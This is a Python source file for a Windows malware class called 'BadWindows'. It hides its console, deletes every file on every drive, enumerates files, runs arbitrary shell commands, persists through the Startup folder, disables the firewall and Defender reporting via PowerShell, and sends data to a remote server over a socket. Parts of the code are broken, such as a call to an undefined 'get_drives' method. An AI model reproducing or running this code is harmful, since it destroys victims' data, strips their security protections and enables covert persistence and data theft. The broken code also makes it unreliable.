import os
import socket
import win32con
import win32gui
from ctypes import windll
import string
import subprocess
import getpass
class BadWindows(object):
    FILE_PATH = []
    def __init__(self) -> None:
        pass

    async def hide_console(self) -> bool:
        try:
            hide = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(hide , win32con.SW_HIDE)
            return True
        except Exception:
            raise Exception("I Can't Hide Console")
        
        except:
            return False
        
    async def delete_all_file(self) -> bool:        
        try:
            for drive in await self.get_drive():
                    os.chdir(f'{drive}:')
                    pwd = os.getcwd()
                    for self.root, self.dirs, self.files in os.walk('.', topdown=True):
                        _ = [os.remove(os.path.join(self.root, name).replace(".\\" , pwd+"\\")) for name in self.files]       
            return True

        except Exception:
            raise Exception("Error , I Can't Remove File")
        
        except PermissionError:
            raise PermissionError("I Don't Have Permission For Delete File")
            
        except:
            return False
        
    async def get_drive(self) -> list:
        try:
            self.drives = []
            self.bitmask = windll.kernel32.GetLogicalDrives()
            for letter in string.ascii_uppercase:
                if self.bitmask & 1:
                    self.drives.append(letter)
                self.bitmask >>= 1
            return self.drives
        
        except PermissionError:
               raise PermissionError("I Don't Have Permission For Read Drives")
        
        except Exception:
            raise Exception("Error , I Can't Get Drives")
        
        except:
            return False
    async def change_background(self , path_file:str) -> bool:
        command = """
function Set-Wallpaper($MyWallpaper){
$code = @' 
using System.Runtime.InteropServices; 
namespace Win32{ 

     public class Wallpaper{ 
        [DllImport("user32.dll", CharSet=CharSet.Auto)] 
         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; 

         public static void SetWallpaper(string thePath){ 
            SystemParametersInfo(20,0,thePath,3); 
         }
    }
 } 
'@
add-type $code 
[Win32.Wallpaper]::SetWallpaper($MyWallpaper)
}

Set-WallPaper("""+path_file+""")        
        """
        with open("wall.ps1" , 'w+') as file:
            file.write(command)
        subprocess.getoutput("powershell.exe -F wall.ps1")
        os.remove('wall.ps1')
        return True
    
    async def rub_command(self , command) -> str:
        return subprocess.getoutput(command)
    
    async def get_files(self) -> list:
        try:
            for drive in await self.get_drives():
                os.chdir(f'{drive}:')
                pwd = os.getcwd()
                for self.root, self.dirs, self.files in os.walk(".", topdown=True):
                    _ = [self.FILE_PATH.append(os.path.join(self.root, name).replace(".\\" , pwd+"\\")) for name in self.files]       
            else:
                return self.FILE_PATH
        except PermissionError:
            raise PermissionError("I Don't Have Permission Find Files")
        
        except:
            return False
    async def add_to_startup(file_path : str = __file__) -> bool:
        try:
            USER_NAME = getpass.getuser()
            bat_path = f'C:\\Users\\{USER_NAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' 
            with open(bat_path + '\\' + "file.bat", "w+") as bat_file:
                bat_file.write(f"@echo off\nstart {file_path}")
            return True
        except:
            return False

    async def off_firewall_and_defender(self) -> bool:
        command = """
\rSet MpPreference SubmitSamplesConsent NeverSend
\rSet MpPreference -MAPSReporting Disable
\rSet MpPreference -DisableRemoveableDriveScanning $false
\rSet-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"""
        with open('script.ps1' ,'w+') as file:
            file.write(command)
            file.close()
        subprocess.getoutput("powershell.exe -F script.ps1")
        os.remove("script.ps1")
        return True

    async def connect_to_server(self , server_address : str , port_address : str , data : bytes = None) -> socket.socket:
        sock = socket.socket()
        try:
            sock.connect((server_address , port_address))
            sock.send(data)
            return sock
        except Exception:
            raise Exception("Connection is not possible")
        
        except:
            return False
